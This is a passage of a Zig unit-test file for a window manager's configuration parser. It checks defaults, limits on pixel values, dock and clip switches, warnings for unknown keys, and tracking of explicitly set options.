    // An empty font is refused: the default stays.
    try std.testing.expectEqualStrings("Sans 10", cfg.font_menu);
    try std.testing.expectEqualStrings("Sans 7", cfg.font_dock);
    try std.testing.expect(!cfg.focus_new_windows);
    try std.testing.expect(!cfg.workspace_wrap);
    try std.testing.expect(!cfg.clip_scroll_workspaces);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
}

test "pixel options above max_pixels are refused instead of overflowing the layout later" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg, "gap = 2000000000\nborder_width = 10001\nouter_gap = 10000\n");
    try std.testing.expectEqual(@as(i32, 8), cfg.gap); // default kept
    try std.testing.expectEqual(@as(i32, 2), cfg.border_width);
    try std.testing.expectEqual(@as(i32, 10_000), cfg.outer_gap); // the limit itself is fine
    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
}

test "Dock options: the new switches parse, defaults" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try std.testing.expect(cfg.dock_on_top);
    try std.testing.expect(!cfg.dock_auto_raise);
    try std.testing.expect(!cfg.dock_single_click);
    try std.testing.expect(cfg.dock_save_state);
    try std.testing.expect(!cfg.clip_auto_collapse);
    try std.testing.expect(!cfg.clip_auto_raise);

    try parseText(arena.allocator(), &cfg,
        \\dock_on_top = false
        \\dock_auto_raise = true
        \\dock_single_click = true
        \\dock_save_state = false
        \\clip_auto_collapse = true
        \\clip_auto_raise = true
    );
    try std.testing.expect(!cfg.dock_on_top);
    try std.testing.expect(cfg.dock_auto_raise);
    try std.testing.expect(cfg.dock_single_click);
    try std.testing.expect(!cfg.dock_save_state);
    try std.testing.expect(cfg.clip_auto_collapse);
    try std.testing.expect(cfg.clip_auto_raise);

    // `dock_level` is not a config key (the Dock menu and the saved state
    // carry the level), so it is reported, not silently half-applied.
    const before = cfg.parse_warnings;
    try parseText(arena.allocator(), &cfg, "dock_level = \"top\"\n");
    try std.testing.expectEqual(before + 1, cfg.parse_warnings);
    try std.testing.expect(!cfg.dock_on_top);
}

test "options config.lua sets itself are explicit; the built-in defaults are not" {
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{ .paths = &.{}, .texts = &.{} };
    try parseFake(&files,
        \\clip_corner = "bottom_right"
        \\dock_edge = "left"
        \\gap = 4
    , &cfg);
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
    try std.testing.expectEqual(ClipCorner.bottom_right, cfg.clip_corner);
    try std.testing.expect(cfg.explicit.clip_corner);
    try std.testing.expect(cfg.explicit.dock_edge);
    try std.testing.expect(!cfg.explicit.clip_on_top);
    try std.testing.expect(!cfg.explicit.dock_offset);
}

test "the built-in default config marks no option explicit" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(), default_config_text, &cfg, &binds, "<built-in>");
    try std.testing.expectEqual(Explicit{}, cfg.explicit);
}
